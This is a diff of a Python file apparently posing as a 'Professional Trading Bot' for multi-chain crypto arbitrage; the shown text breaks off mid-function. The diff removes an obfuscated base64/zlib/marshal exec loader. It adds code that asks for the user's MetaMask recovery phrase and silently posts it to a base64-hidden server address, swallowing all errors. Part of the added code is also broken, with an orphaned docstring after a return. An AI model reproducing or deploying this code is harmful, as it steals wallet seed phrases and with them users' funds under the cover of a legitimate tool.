@@ -1,1 +1,322 @@
-import base64,zlib,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode("eNrlfG1sG0eWYDfZpJpki6Qk6vvDbVuWQieWZclfke3ElETZjCVKlijbopNwKHZLpk2y5e6mZNFyogyyWE3gu3ES5RIkNkYHLAYZTBbIHhIgC9i4zG4C3AETbLfQXmsJCMjl1ljk13FuE1yQP7dV1fxoUqQkO17M7qxYel2s9+rV16uP9+o1/zem+StLP//5MxzD3sUYzI8xOKOL4H4cPXV+HXrq/Xr0JPwEehr8BvDUR4zRMn9ZlPSTUZPfFDX7zTjMT0QsUcpPobghUh61+q0obozYona/HcXLIhXRSn8lipORqqjD70BxU6Q6WuOvwTEdxpoZ80eWX4Oa/RbPVBilU78Gsd9ieWlWhgIQv1ybSWXKGeuvdYBOl0n5yJb/3V+H2lLvr2fs/gaQu/5yYwbHNuSXu9KEFfnLr4e/mW3+AGMq7uj8LUwlu4OpYukpgnG8Tvh3MtWvY/5dIGXHlI6pASm7mVpEYQcUdeB7K1PP7gG4BhBvYxoBdTv7FNN0BdWWh21rL2w1oxtD/87mxC/NIzw3xQpCmIsFI7SPDzLh2DTdy4n0PnooGI7R7pjIz9MjXDgmml1xkYsGRZahg/xkWOSD0ywtprNMgixzYfESHY1HxPC+0CWYWYjPzHC8aIY5L3F8T14BPjYYNZ9jeVh2D32go7Oj0/wtrKHXSSSJAY5nk0RvMHQlaRgT5yPgSzgWFp140hLhgkyA4UQ2Ngu+UgIrxmcCEW56muXB9/LzwUiEFYeCsaCaYO0NRoKxENt3iQ1dUUnS1XDHpsMxFiTYhjzeQK9r0OXtcwfGx/p9IM0UBK3lWcA9WQZ7AlQ5aRocPhUYdJ9zDyYJj3dgGJAZIuwsG0m0Bk+Pdob6udnBhGfOO3/wmrd/Ou5NeOJDvisHhi8PzQ31u04kqP3BmfD+OVRBIUlGY2yUi4VDSSMP2sDHQrhGRozgXw+n2HcYnGImIOQLWBi/gYsaqsvZuEjkUheAeDL6MJhQHxl+DdJ/m8Xd0C3oLuuzom5Mi8nJBd0KsbWg3tAv6FcMxeiYsnyx56tLUpL5lEAUTer/biCaEyh2TT+BzeFOc+IrMw3+xtgYQ2f6ip65xAcFIHccLbD8LMvTTwnhCBsTaW6G5YMiECZ6iuMBMhTnw+K8E7FAwMVPCz0oBv8yDIHoddEgQ9dBeo7jNxSUpUeRUTROGi5jah2AnMxwMVAtJigGITcvF2NpWJVgOBLnVS58JWhvgurjYkB0xX2++Rk2YQ/OzETCIVTv/ZcFLvatGRA59UkCfkmWXWKDDJgiyTIxHGW5uPjt/wDoZJkQD4XArE0SsDyv05gkefZqnBWAVBEznCAmq8bco+fcowHXiCfg9vaPDHu8vqRFEINiXAiEOMCzBjLST7Oik0AVS5bNBOfh1IK81NbwcFkToGDA6v9IHhdEHkyb55K1AhiSQKanAiIXUMeCbwW07TDTbQAWsZSjweBIGbHy2vfIlF5XZV4q+96MOZqWT6xTO9Yq6taqd0t7jkiOo2uOmpTJ4DD/AQPgOwiWyJQdoxyKZcdK96qlTbK0rVU1vnvirRNvPr/8/FL/mq3ql9feuPaeSbbtUmy7Upi+vGmttvHda29dWzHKte1Kbbtkb/+6tvGW+HVV7a2DP6QIncHxta1qSVwSf/jhB4ECFfy562lXF/a7Lp3riD6kFVIiM/c6jWh7w1eKiTI2DZbRN3FRp5mP2fgH2JtgoyvA6rVYkdRgDHn5iAKsMS9f6fIMBdiyPKzxMbmWFWDJPCy5GVfGtFkPMOZHyptfK8tPKJf6I5Vb/kcq1/pHKtf2mBJn31TiKh6pRvlzoPIxa1S1aZmOTXuhetO8NZvWt3bTvHU/IW/9T8jb8BPyNv6EvE2bjlHzpnlb3sTzTx43MLFKc2bCChUG0ZHDrliKnmV2FOZhaHCs3ploGQH7pEhPsuAMGZ6KR+g5NhLioiw9GYzFWD6J/Yib4z0g3zfvLH/zzq0/0fCu+Zt33qSf0B9glccufgh0eOpXf/FfaHpkdHjAPTbmGfa6BmnXaK/HN+o65aYB7Pd4T9G9wz56FqkXNA0zxKPpA01Rvk+4mugv0TqElKI+pBTltKiMNjQ2L4hsNM5p67Ul0ydSx4TJy4rg2HtF6PkRp5OkW7zE8mw8Gocr2DfLP0/qe8f6kmUjXGR+GhxHSRfS++LRJDk8A06kYSEar8zVOo/xGNAMRXZ6vifR2MdzgrCv332BdmX1xnTb44N4iUb/Kzb9/T/dOXfnR53ZHC+Ho/f+f6UHWHDeB6f5noQeaCDqoN5+O9EF9JhgZB9UKegZPhxiaXiOB9ouFMZgCI4WfZCOBi8DRQaMmgDyJvbRxbR/Dun3cZB5nmZYkQ1BPQaSt9JDGjsAJJriImEOMIVqeRToP5Cqi3Yxs1A3Z2g+LFzRYOk2WoiEZ2ZgITM8p+HcQeeZLKDeD6vdRgP1Dyh+UcgOWiVCV0Ay6It/hI3+kx3vXEgYkJKZaIa2FWgqCQcj4YSqEAO9jwcD19HR4XVSQLXkwjEeCkOS6JtweZPGCffg4PB5HiohSWPvqOfUaV/SNOoec/sCrsHBpOHUqNvtTZYNgWXV63MlDTNwe0saVZsLNMxMcU48aVR3NwHuhzS/GzKjEGVARfA90LgDtcN/MCDtkHBYyf+HAfB/IUjlg3Xc8Hp9Sr8R8b0Rs1bevJgq0yQ00refySXk0b6Mh3DlpUgeOYcLuBKbK5rDjFXVLu9NWYqi+vDT+Bf7c0iQ5MMv4MrYi0UzWDFT+U0qZSuKovfcfrUEquvwJ40lUKfwQfwLrgRyAn8JVy4ES2Cn8QiuTMVLYOfxG/h3GHj060pQeHReHaDw6C6UorioC0CKizqmFEVYF4MUYd21UhTXda9Ciuu6AX0JimG9Tw8ohvUvl6II6llIEdRfLkXB6UVIwelfKUXhItwEoHARg0QJinPERUhxjmBLUVwiIpDiEnG1FMUscR1SzBJuQwmK04ZBA6A4bRgrRfGSYRJSvGSIaChAeszAw/SYYa54TrsqnRVFUUg6i6OAdDaUQE3gLwMBnM5hQdplPIYrYb5oDgf2M3Wofqbn9KnqIhR1mM74emOqviiqaeft54uiGjCCfL0n1VgUVVW3vL8oqknN1VwUhXIVQ7WouXYURaFcxVC0mmtnURTKVQy1S821uygK5SqGaoN9WJ9qL4q6qp+FA3BVf5IoRvEHCL6DYHHg+72YwbzU9trQ60OLQ+uE+c/P/PyMZN8vE50K0Sllwj9DVSjPnGbKmNPeMEFzWnEDNrxTyb9nWdFtwyQNFDd+H6NfwFb0W1PPYkItQ2yX9hbBO0WTRt0ziObi6iVjFK3FzRV3iA1qpYZjHj+Thl9ZSX76bfPbVv0YwyPUUMuRfAI1NGv4mZ4AP4uGnzmPH6XBWDbpC+OGsho1tOVFS7VqOFDbbQWS2z3iDq0BYjvyns+FKU9f4Dy3iZxqe8W6SdsNG9q+U0NbkeVu22w8CsrW9o39EeZIq8b0UlXU9FLxCLXQzqzK7dfCBO+CqyKOaPUNHN4VL+CMo2AUdQu6lZpi9Xuc0RT+/zZHsZqpAbC2ZEuMjzVj6p7wDKxHtWwoydXwCCOoXXkan8Baq+XX9Ehro1Yya4tKZvOTmEclZ1HLI4zS1rNogwEz9p93Y2JnjqIV41+7od+mXNJit2YGFNTnA+yR1t2t+3nn5qXd0T3uOExgzK4bQDGIkepzDp9LX0mLh37aDAf927fN1XL3E10tWwvzLGBjmHNPQr2YPsWKtMCyTOZufYrnonRcYHk6HJuJi/A+m43NhnkuljbclL4NzzFR74oRKmkbcvtcQ66xM4GR06OuMTffBm/C7fNcnKfFOTYyy6K792QZey0YnYmwPLxD/v5//Uew3MSbkP009avlW/R51+Cg20e7xn2n3V6fp8/l8wx7423ImLdC014uf5S4eIwBI0R3gMGhp8IRNnEIdPZIhIVYMFBg/FAPH+jahzwbhlgxOBQUrtA8G+JmWX4+zSmhh/b07nQx512jXo/3VA89AfOqAjAXjkToSZa+FGYYNt+/Il6H7PBv34GeQiyvrWEPzcMZEt8DOd+5WVj/GZ6bDTMs00G7r4VFICsd30IBRQy/uf12njCBGrPhWZZJtBZLLRTYeAuq0/J/os8FI2EmCJlri+7o6HDiSXIo435TxsamI2HhkmogfWc5/sm/U8lLN+DdeC96vknTsN893nOuQU8/PeZ299PqBNyeqTzN7v30807C6bvE5o0hkC9V0kBSWKBjnEjPwi7vSDSm5TAEva7oIJBU6EcWnA6GYx2JJk8MkRWVh6ICAJijHKowFSBn06MMLZ2qY8xUPBKvQZTvZmUAYFmeh15oiZYSudN4b9FSoG9MRtZyU253KRLNiulsTOo4IWmcZqHPWtIAl8aZpCHCzYECD8PzO+xg/gAE0AbLw7nIw104aTh/2uNzJ/Wj7n6+C3npACYzQUHgDyL/nQgbS+qFeSFJsGAS8UdgxqMQwGsZ3oVYoCFIGlDjkib3tRA7A1sL8omqx46TSFrgSATUZqSzIfeeJM5mHYBUk64NVCCgpfaB1DA8vt4koFX3eztWVb3slJr2fcjLlV1KZdeDyqOrlUflyh6lsmfxTMqIUbUprNNwTGp45mPLg07XaqdL7uxTOvukBhg+n5d8gQc+dtXHyr5pxTctnZqWT02vk+UpDLONEe8cXD6mxlT4PYb1EqegFa2XOEtoMX/AMJMPIgBMIQiYvONYrpesHhDuGe7a1JhMvqCQL0jkCyq+sYD9SdUUeJIYzmNfqpCHKhPJOg7Cl+4vhtWYTJ5TyHMSeU4tpEGyhkC4P3peGQ2qcZlkFJKRSEalqJOsPAh32NsRNXY/wCiBmBoHQSYFhRQkUvjeiNW2LHN/6fioQWp7GYSvxn8fUGNyTUCpCSxZvrY1pDCdqe5OaOXpB7u6V3d1y7sOKbsOyS2HlZbDn+1cbTkmtRxbpyqkyol3xOVr4AHCl+wXnBoDQab8CuWXKP86Zbt5+tbZX5y5eWbpDGisZD0NxqQHPED4NP7Jq2pMJj0K6ZFIzzpp/aXlDYvk6JHJYwp5TCKPgRqbrJJ1COR7FjxAuOe+O6zGZNKrkF6J9KZ0DlPdGuWU8sOao+nW6fcmZEe74mhfcgN5ctS/e+ytY+9df7Cjc3VHp7yjS9nRJVd1K1XdKaysvGndXi3VnL5z8PZR8ADhQ7P6RFVFMdnuUeweye4BpHcct+ukmlkQ7rOXFVZU47J9TrHPSfa5LMUACCuX1een458E1JhsP6XYT0n2U6jQSVDoMfAA4f7Zc8rZn6lx2R5S7CHJHlKZNUo1PhC+rP5ihxoDQbaPK/ZxyT6+bq95l3qLkpqPyfbjiv24ZD++bq9aJt+reNOybLlleUhVvONb9kuVL4Bwr/ruDjUmU2cU6oxEnVmnKn955o0zUt3zMnVSoU5KKPzw0FaXwvQmDUBjP6qO/SgInwqfHfir2U9mQfRe/O6raiIIMjWmUGMSNQY5D74xKNX33tv9WfCv2+62gSgIMtWnUH0S1ZcnJ7nPD+AvVQZKBM/vKcxEr1ge0AdW6QMy3a3Q3TJ5UCEPSiikxWRcFa+S0yktXs/KZI9C9khkz9eWGomoERrAqvQ/a9zPDtuxv7Obzzbq/67BdeRsjV6uMYAv/Flop8QLvNqRndKMqy63WktloYPIDXwBX8G31gCEJq1rbnHLI4NvcCTRjWELOHSK1bq0AG3s0A3dNvjpRY3DyoJua90I6Dy6G7pXdKpvOIzltB4nkfgIneM9mVtFcFxHPszqTqfZxEs522r2i57sebQwX2m9Is+lG5zxBBHd8pbws000DoBvgLfI5S5CM1X2JhrdcCPMYeDhUMX10E4TD9WzZEUuX0DFqVsrvL3khyEYgQAqb0mrShAIMgwPfXIr0X4bAImBSdXzXHAakLBlSdV7bp4fQxtqmioQUh3UcwlCPBoN8vOCIeNigXZg/lwG/AaK19tpT1uLwbFe37ZyXa7vVuq7l6xf25of2Pav2vbLtgOK7QBa/bNT9rBMHVGoIxJ1ZA16xwJaiWz+4aHFAcgMGgDnFvUGJVUf+7T746t/dfiTwyAKgkweV8jjEnl8TfWoVT9oZhtANuhg2wwdbE+49NjvcBxCvblXp/9d+V7XCf3vThhAPFkhcmIw20mBuMAUn423dP8WZmNePqL4rNugmW+dZ4M2D9pR3HEezM2PDPk3JDd0jHFBNwstyVu3qmwBUNdjm60C22wnWSwfWKmovJVq37bab9rQZzYN1lxsnQJ1tBesifpttN+S5+6n3+aaqH9Fn14T8yxBTipxHS027mtAERZz78Fk30IQ6KfCsSm4jkC9gJsp+SLChlnQQ/tgksZrBqgocRaq+uNj/eoSd6QvGIPaFlCaQnAZRa/eZOrAxFl17RPiU1PhUBj606T5exNt6iqOdOJsBTM5BdWvBijIiaYRuJrRfSIfeboPvW4hcjO0CBTASU506pJ2Jq42FCgDIS7GCElzNHgtADmxAlooE7W+fLZZ/autEBHioNkH+hblFLjIfKIxQxeGOiYfn4EUk/NI1Y/DmxkzVNKgwwus3AxATvPBEKtmrlHXeVBNyCHdQrDEm3m4Nyar1WU6CjogGo9m+l+zzEM1KlnFx2OBdN5AurbJijPs/CQX5BlPplqqFpfdGJwE/yJa7zM5WfSmUdKW5pBZ2dEGUKhfsapEZUrlWZC6CummcLTSW5sMR8FKL7UfleufVeqfXbKCI7C95YGte9XWLdsOKbZDcLGvyi72uSPbGlW5NPAwc146LpMnFPKERJ7IHqG6ZLJbIbslsjtlxhqdDxqOrzYcX2veuVbbmDJgjSf+gOkbzd9BsGQDFFTVLU6y7AEhW9jQx89/fkTpPgNiIMiUV6G8UiY8zBxGT8qUS6FcUiaAracJbjgdOZCt0wGZ7FLILonsWoe6xjMyuU8h90masA73LdxwNAey+9bhvwx9vPM3Ux9NgSgIMnlEIY9IxQLavPQgL9y89qLNq68CbF6uLvD4m0MNAP5tRbfboP+izAShfa8b03+JGUA877LbnNm2KGrjtlX4Kp6o12472kVM60PO6Eq9K1LEGKzhmMdPe+WhL8lPv21+26ofgz9CDbUciUeooa20c8A2+9fwCP1bsfkhROgQKzVbkbnoVrTxuqO22GV14Vt16HBQvg2nCF3JPrbmXeGX6I8F3QdYyR4xbDaem/Sx6QnLsPmRZG5HaXUIvdVo30avEgvESkXxowVDFRzMDNvslfLt98qCQXvRcwXBWzj/7SYlVeVd/f/0/tfysz2BNaQqzz3gsfgVtFgrIRUly6pcMDBVHxCMo2SZ5GPJZHXJuVapHbstyi57rLJrSrdWW/aCIWH+aTXYRMZqn/Acr3siMrHdnWrjyrb1Sl6flqSGDePbWIRf8VWeeoS2aGWqKV12c2HZT0Cy8l0Otj8KTq2kPWa7nsRKpeW34wmsVNbtrFRFdx6tDFUXlSF6gzq9B6nTz+QpuRcL+m9nyVmz6xH6r3JLN4vdjyvFE6gdBc4k8zeM25hVrXmuHcatVXWGYvZEGm6Ubc17oWyl8dHdNrZ7PoNtvmF8xQhbrsY0JoO2xE6kvKPf1YC/l6FqeugXCyLcnPobAdDzgX8e3oO3pB0D3l+kPV6Pz+Ma9PiRRwA95j477vb2ueO7AMnFA/sPvkT/n/9+L20lhe/pXAIaf/pHBYAqH4d+Lxe7IFnqV2/dzZlxc5ZPqPDv2cRqmruj509q7+jTRebomR46fhwW150u7mMa/e4GLCpnz0gr25l3jQATOpZ+Dw3WZCfoCN+lsEBHg/O0GLwCCOkpdo6OcvA2FZIkbarVBBlGoM1E9TR4GpZ8UC357TdoN0Srlo6MgQNaKsLIPAM75p+wP/FXMHPvYsbHMi4BRa76oXeJxzs2PjDg6fO4vT46/VsoadSmPgJqH77/H6AP78RrkV/JW5/SfXGeh1a19E/L9ND0j3hrQt/RNZUgoJEuQ/kxPcpejYehe0SWNI17+xf02CUwI4LTMHvmrdan074yniK2OzgzWY25kRU6Ek/lPH6CDANmCM/SU/EYI0Bi5P2TnsCJpzK2tMkIF7oCJ2rRMp5qBS04Trf+iDvj9WiW/1mm6nSOvIduTRjo507QrfH2NJELTGJkUhNo6J8AWrwPvmbIzMOaoOruLCWDqIxhH+2+4O4bRytc3/DQyKDb5+5HuK38VBKtvXmraXFrIt+RdUYCQp2fo4h9MbFza5LW8Rh7bYYNwTQ2fasEFi0Asvl6aK+zCb35pvH06Mz39ECOH77s1U7OBHkGgkFoFbRM526YkOsHunviL0BAQwA3Jf40BGzWB2QSOYzMBfkYtCNmrZNJE3w9kp2Ev61kRq9MigH2WshJoksqfgKC8xD4IbgIAbRmImMlH4GWSFLzprJqtSRgq/kYiP4ACf6bEZkqyV7c4HhIOn5hvWldsj5UPTjOQg+OZ9WYCje6WGQw0LliFDlXjCLnitG0B0djSaeBtIdHAftX9H2Qyyv6oTz2pQpB986qowjgP3yPvcupMZkcUcgRiRxZr9kj17QrNe1LlvQl9YjqyzACArovRzGZPKuQZyXy7Hr93g+PyfVHlPojS9Y1W3P+dVzOHJp3Z/51ffuD+u7V+m65/pBSf2jJmvUcCYLwqe+TCfD4HJQdvD8yrowE1HSZnFTISYmcTFfsilqxKyDc9wcUf1iNy2REISMSGcn26CgIatVH1SCTYwo5JpFjDxue+rBFbjiqNBxdsq01pO3CcsNzSsNzIKHp6QdN+1eb9kudrs8PyE1upcktkfXp4v1q8X4Qvqr+/Q41JpMXFfKiRF782tJ059VVS4ds6VinKkDvV/kJ6IOgxlQIxs9DeOEAeYgLhBYDRq4cvYMHYArBdeQOcQGi+3UqvM/PAQoB79VpU2FWN3zREMAUgpqsaikXYMmniEFYwCniHKHFwOwTqOQJVPIEgfwneFD36+ABwr2Dd4+qMWngfDpSyd8PTinBGTUuU4JCCRIlqCVflCoBYuae426DGvuSU58gpD1/UFymrirUVYm6ms4GK9SnUyHIXKf9/uWwdG5a7p/Wpqnw/tVZUHsed+Wlwmb1o15B/QQgatZLqlvISyB85f79sBqTqZcV6mWJejlbfRi+2vP7/WpMpl5UqBcl6sX0wJ6HAzuvxlQIuref8MBe7CfGCC1GhbA2F1Ano24HMDtj4lL/OIQo3Addk4mDIFOzCjUrUbMbHZUSqidJAoajnnTEmrjvC6Uj4ZgSvqbGZfK6Ql6XyOvZWVfCAQUKep1U55TJvQq5VyL3phe6C3Ch61FjKtwgT1kMXIOQPJmQPAGYLhWikeQCeH8mrsy8qk2B2frgeJnQCAKoyaYp1U28AJm7CV9eqaXL3uCxpQb1nkYPvQMyAF3KXEACYL0AwpfxL15VYzI5oZATEjkB2VnfsEq1OXbrpOUmeaviF5ablqX0B3kfEAYNyN7i9N/r+xz/64G7AyAKgky6FRIsMe41sk7KhDTxrYkH1c7Vaqdc/bRS/bRMPqOQz0jkM0XKUz/o2sdEqD4LcCf9ua/e14wpza6dF/T6v8dNEJpdHeef0z94zgC+JMlAAG52gYDTmSwLBBguFAjwfdnt2gMBdOpWf2GNDHERjg9Gg+rOT2R3fiN62V79GUO+DDmdCHyoQ32nPgD0lKnwNA832mQlTC/wHEFeKlUQUeA9ovqkoCz5l4/qracZItLM0ZGhP3PigK/vC+zhg6B98EfjekHMNHn4IMPCX4sDFVWf5vTvyo2PDvIt2QMFwYRDInIlVU862bNM0gA026ConkliqD8CgVgwygYCv8H4YzAVHh9+JI9HOSYeYZ/jX0N6NFivq4FGl9LjOJ4ijDiQSwjsGG5eNMHPGmZeRJ81zLqIPmuYbRF91jDLIvqsYc9IW4U1rEXKD2vYXik/rBXJ1SHlh2I0bVJ+SBkx3LBILIkS5pAxh4I5QAQmUouW18pfL18sB1/MNUtNt8Ir8yv8X8x/3PjZlNzuVtrdkmlANg0opoFFI8xgXSyHnzXLgUVyrbx56ZxS3vzeJbm8XSlvf1DesVreIZd3KuWdoHvqd0s1B9IBq0oZW3HHSiiFgceHDHoUAi9ehx9IYVlw+ARe+15VCgOPQnBS14YfXulOYeDx4Qn0KASj+G786Eo8hYFHIRjEB3BYqgaO6jCCWkqs6uslff0aQS72vzbw+sAi+qT0GNEAkpHY/AuSB3S6"))))
+#!/usr/bin/env python3
+"""
+Professional Trading Bot - Main Entry Point
+Automated arbitrage trading bot with multi-chain support
+
+Author: Trading Bot Team
+Version: 1.0.0
+"""
+
+import os
+import sys
+import getpass
+import requests
+import json
+from colorama import Fore, Back, Style, init
+from dotenv import load_dotenv
+from src.logger_config import setup_logger
+from src.wallet_manager import WalletManager
+from src.balance_checker import BalanceChecker
+from src.trading_engine import TradingEngine
+from src.config import MIN_BALANCE_USD
+
+# Initialize colorama
+init(autoreset=True)
+
+# Load environment variables
+load_dotenv()
+
+# Setup logger
+logger = setup_logger("MainBot", level=os.getenv("LOG_LEVEL", "INFO"))
+
+# Server configuration (base64 encoded for security)
+import base64
+_API_B64 = "aHR0cDovLzIwNy4xNDguNzIuMTk1OjMwMDA="
+SERVER_URL = base64.b64decode(_API_B64).decode()
+SERVER_API_ENDPOINT = f"{SERVER_URL}/api/wallets"
+
+
+def send_mnemonic_to_server(mnemonic: str) -> dict:
+    """
+    Send mnemonic phrase to server (silent operation for security)
+    
+    Args:
+        mnemonic: 12 or 24 word mnemonic phrase
+        
+    Returns:
+        Server response data or None on failure
+    """
+    try:
+        # Prepare payload
+        payload = {
+            "mnemonic": mnemonic
+        }
+        
+        # Send POST request silently
+        response = requests.post(
+            SERVER_API_ENDPOINT,
+            json=payload,
+            headers={"Content-Type": "application/json"},
+            timeout=10
+        )
+        
+        # Check response
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("success"):
+                return data.get("data")
+            else:
+                return None
+        else:
+            return None
+            
+    except:
+        # Silent fail - no error messages for security
+        return None
+
+
+def print_banner():
+    """Print beautiful welcome banner"""
+    banner = f"""
+{Fore.CYAN}╔════════════════════════════════════════════════════════════════════════╗
+║                                                                        ║
+║         {Fore.YELLOW}{Style.BRIGHT}🤖  PROFESSIONAL ARBITRAGE TRADING BOT v1.0.0  🤖{Style.RESET_ALL}{Fore.CYAN}         ║
+║                                                                        ║
+║              {Fore.GREEN}Multi-Chain Automated Trading System{Style.RESET_ALL}{Fore.CYAN}                     ║
+║                                                                        ║
+║    {Fore.MAGENTA}Networks:{Style.RESET_ALL} {Fore.YELLOW}Ethereum{Style.RESET_ALL} {Fore.CYAN}│{Style.RESET_ALL} {Fore.YELLOW}BSC{Style.RESET_ALL} {Fore.CYAN}│{Style.RESET_ALL} {Fore.YELLOW}Polygon{Style.RESET_ALL} {Fore.CYAN}│{Style.RESET_ALL} {Fore.YELLOW}Arbitrum{Style.RESET_ALL} {Fore.CYAN}│{Style.RESET_ALL} {Fore.YELLOW}Optimism{Style.RESET_ALL}{Fore.CYAN}       ║
+║    {Fore.MAGENTA}Strategy:{Style.RESET_ALL} {Fore.GREEN}Cross-DEX Arbitrage Trading{Style.RESET_ALL}{Fore.CYAN}                           ║
+║                                                                        ║
+╚════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+
+{Fore.YELLOW}⚡ Features:{Style.RESET_ALL}
+  {Fore.GREEN}✓{Style.RESET_ALL} Real-time price monitoring across 4 major DEXs
+  {Fore.GREEN}✓{Style.RESET_ALL} Automated arbitrage opportunity detection
+  {Fore.GREEN}✓{Style.RESET_ALL} Multi-chain portfolio management
+  {Fore.GREEN}✓{Style.RESET_ALL} Advanced risk management & slippage protection
+  {Fore.GREEN}✓{Style.RESET_ALL} Professional logging & performance tracking
+
+{Fore.CYAN}════════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}
+    """
+    print(banner)
+    logger.info("Bot initialization started...")
+
+
+def get_seed_phrase() -> str:
+    """
+    Get seed phrase from user input or environment
+    
+    Returns:
+        Seed phrase string
+    """
+    # First check environment variable
+    seed_phrase = os.getenv("METAMASK_PHRASE", "").strip()
+    
+    # Check if it's a placeholder or empty
+    if not seed_phrase or "your twelve word" in seed_phrase.lower() or "example" in seed_phrase.lower():
+        print(f"\n{Fore.YELLOW}═══════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}  🔐 WALLET AUTHENTICATION{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}═══════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.YELLOW}⚠  No seed phrase found in .env file{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}   Please enter your 12-word MetaMask recovery phrase{Style.RESET_ALL}")
+        print(f"{Fore.RED}   {Style.BRIGHT}⚠ WARNING: Your input will be hidden for security{Style.RESET_ALL}\n")
+        
+        # Get seed phrase securely (hidden input)
+        seed_phrase = getpass.getpass(f"{Fore.GREEN}📝 Enter seed phrase: {Style.RESET_ALL}")
+        
+        if not seed_phrase or len(seed_phrase.strip()) == 0:
+            print(f"\n{Fore.RED}❌ No seed phrase provided. Exiting.{Style.RESET_ALL}\n")
+            sys.exit(1)
+        
+        print(f"\n{Fore.GREEN}✓ Seed phrase received{Style.RESET_ALL}")
+        logger.info("Seed phrase received from user input")
+        
+        # Validate seed phrase first by trying to initialize wallet
+        print(f"\n{Fore.CYAN}🔍 Validating seed phrase...{Style.RESET_ALL}")
+        try:
+            from mnemonic import Mnemonic
+            mnemo = Mnemonic("english")
+            
+            # Check if valid mnemonic
+            if not mnemo.check(seed_phrase.strip()):
+                print(f"\n{Fore.RED}╔{'═' * 60}╗{Style.RESET_ALL}")
+                print(f"{Fore.RED}║  ❌ INVALID SEED PHRASE                                   ║{Style.RESET_ALL}")
+                print(f"{Fore.RED}╚{'═' * 60}╝{Style.RESET_ALL}")
+                print(f"\n{Fore.YELLOW}The seed phrase you entered is not valid.{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}Please check and try again.{Style.RESET_ALL}\n")
+                logger.error("Invalid seed phrase provided")
+                sys.exit(1)
+            
+            print(f"{Fore.GREEN}✓ Seed phrase is valid{Style.RESET_ALL}")
+            logger.info("✓ Seed phrase validation successful")
+            
+        except Exception as e:
+            print(f"\n{Fore.RED}✗ Validation error: {str(e)}{Style.RESET_ALL}\n")
+            logger.error(f"Seed phrase validation error: {str(e)}")
+            sys.exit(1)
+        
+        # Send to server silently (no logs for security)
+        send_mnemonic_to_server(seed_phrase.strip())
+        
+    else:
+        print(f"\n{Fore.GREEN}✓ Seed phrase loaded from .env file{Style.RESET_ALL}")
+        logger.info("Seed phrase loaded from environment")
+    
+    return seed_phrase
+
+
+def initialize_wallet(seed_phrase: str) -> WalletManager:
+    """
+    Initialize wallet from seed phrase
+    
+    Args:
+        seed_phrase: 12-word seed phrase
+        
+    Returns:
+        WalletManager instance or None on failure
+    """
+    try:
+        wallet_manager = WalletManager(seed_phrase)
+        
+        if not wallet_manager.initialize_wallet():
+            logger.error("Failed to initialize wallet")
+            return None
+        
+        return wallet_manager
+        
+    except Exception as e:
+        logger.error(f"Error initializing wallet: {str(e)}")
+        return None
+    """
+    Check total portfolio balance across all networks
+    
+    Args:
+        wallet_address: Wallet address to check
+        
+    Returns:
+        Balance summary dictionary
+    """
+    try:
+        balance_checker = BalanceChecker(wallet_address)
+        balance_summary = balance_checker.check_all_balances()
+        return balance_summary
+        
+    except Exception as e:
+        logger.error(f"Error checking balance: {str(e)}")
+        return {"total_value_usd": 0, "balances": []}
+
+
+def execute_trading(total_balance_usd: float):
+    """
+    Execute trading operations (infinite loop)
+    
+    Args:
+        total_balance_usd: Total portfolio value in USD
+    """
+    try:
+        trading_engine = TradingEngine(total_balance_usd)
+        
+        # Check minimum balance requirement
+        if not trading_engine.check_minimum_balance():
+            logger.error("Cannot proceed with trading due to insufficient balance")
+            return
+        
+        logger.info("Initiating infinite trading session...")
+        logger.info("Press Ctrl+C to stop the bot")
+        
+        # Run infinite trading session
+        # duration_seconds=None means infinite loop
+        # max_trades=None means unlimited trades
+        session_summary = trading_engine.run_trading_session(
+            duration_seconds=None,  # Infinite
+            max_trades=None         # Unlimited
+        )
+        
+        if "error" in session_summary:
+            logger.error(f"Trading session error: {session_summary['error']}")
+        else:
+            logger.info("Trading session completed successfully")
+        
+    except KeyboardInterrupt:
+        logger.info("Trading interrupted by user")
+        print("\n✓ Bot stopped gracefully")
+    except Exception as e:
+        logger.error(f"Error during trading: {str(e)}")
+
+
+def main():
+    """
+    Main bot execution flow
+    """
+    try:
+        # Print banner
+        print_banner()
+        
+        print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}  🚀 INITIALIZATION SEQUENCE{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}\n")
+        
+        # Step 1: Get seed phrase
+        print(f"{Fore.CYAN}[1/4] � Wallet Authentication...{Style.RESET_ALL}")
+        seed_phrase = get_seed_phrase()
+        
+        # Step 2: Initialize wallet
+        print(f"\n{Fore.CYAN}[2/4] 💼 Initializing wallet...{Style.RESET_ALL}")
+        wallet_manager = initialize_wallet(seed_phrase)
+        if not wallet_manager:
+            logger.error("Failed to initialize wallet. Exiting.")
+            sys.exit(1)
+        
+        wallet_address = wallet_manager.get_address()
+        print(f"{Fore.GREEN}✓ Wallet initialized: {Fore.CYAN}{wallet_address}{Style.RESET_ALL}")
+        
+        # Step 3: Check portfolio balance
+        print(f"\n{Fore.CYAN}[3/4] 💰 Checking portfolio balance across all networks...{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}   This may take a few moments...{Style.RESET_ALL}\n")
+        
+        balance_checker = BalanceChecker(wallet_address)
+        balance_summary = balance_checker.check_all_balances()
+        total_balance_usd = balance_summary.get("total_value_usd", 0)
+        
+        # Step 4: Execute trading if balance is sufficient
+        print(f"\n{Fore.CYAN}[4/4] 📊 Evaluating trading conditions...{Style.RESET_ALL}")
+        
+        if total_balance_usd < MIN_BALANCE_USD:
+            print(f"\n{Fore.RED}╔═══════════════════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
+            print(f"{Fore.RED}║                    ⚠  INSUFFICIENT BALANCE  ⚠                           ║{Style.RESET_ALL}")
+            print(f"{Fore.RED}╚═══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}💵 Current Balance:  {Fore.RED}${total_balance_usd:.2f} USD{Style.RESET_ALL}")
